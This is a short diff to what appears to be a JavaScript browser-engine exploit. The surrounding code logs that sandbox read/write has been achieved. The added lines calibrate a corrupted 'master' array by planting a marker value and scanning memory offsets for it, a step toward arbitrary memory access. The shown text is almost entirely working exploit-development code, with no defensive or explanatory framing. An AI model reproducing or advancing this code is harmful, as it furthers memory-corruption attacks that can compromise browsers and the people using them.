@@ -109,6 +109,21 @@ try{
 
     log("WASM_RESULT: "+wasmInst.exports.f());
     log("CAGE_RW_ACHIEVED");
+    // CALIBRATE: write unique marker to pinnedDoubles[0], scan master for it
+    pinnedDoubles[0] = i2f(0x4141424243434444n);  // unique marker
+    let calK = -1;
+    // Safe scan: try small ranges around expected addresses
+    // PIN=0x1100011 → index 0. But PIN might be wrong.
+    // Scan 0 to 0x100 (256 slots, ~2KB range from PIN base)
+    for(let k=0;k<256;k++){
+      try{if(f2i(master[k])===0x4141424243434444n){calK=k;break;}}catch(e){break;}
+    }
+    pinnedDoubles[0] = 10.125;  // restore
+    if(calK>=0){
+      log("CAL_FOUND@"+calK.toString(16));
+    }else{
+      log("CAL_MISS_0_256");
+    }
     // Experiment: write unique marker via master, check if pinnedDoubles changes
     const oldPD0 = pinnedDoubles[0];  // should be 10.125
     master[0] = i2f(0x4141414142424242n);  // write marker BBBBAAAA
